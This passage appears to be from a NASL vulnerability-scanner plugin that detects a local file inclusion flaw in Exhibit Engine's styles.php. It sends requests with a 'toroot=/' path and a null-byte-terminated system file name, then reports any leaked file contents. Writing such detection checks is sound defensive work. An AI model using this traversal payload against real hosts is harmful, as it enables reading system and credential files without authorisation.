...
for dir in nasl_make_list_unique( "/gallery", "/photos", "/images", "/exhibit", "/exhibitengine", "/ee", http_cgi_dirs( port: port ) ) {
	install = dir;
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = files[pattern];
		req = http_get( item: NASLString( dir, "/styles.php?toroot=/", file, "%00" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!res){
			continue;
		}
		if(egrep( pattern: pattern, string: res ) || ContainsString( res, NASLString( "main(", file, "\\\\0styles/original.php): failed to open stream" ) ) || ContainsString( res, NASLString( "main(", file, "): failed to open stream: No such file" ) ) || ContainsString( res, "open_basedir restriction in effect. File(" )){
			passwd = "";
			if(egrep( pattern: pattern, string: res )){
				passwd = res;
			}
			if( passwd ){
				info = NASLString( "The version of Exhibit Engine installed in directory '", install, "'\\n", "is vulnerable to this issue. Here are the contents of /" + file + "\\n", "from the remote host :\\n\\n", passwd );
			}
			else {
				info = "";
			}
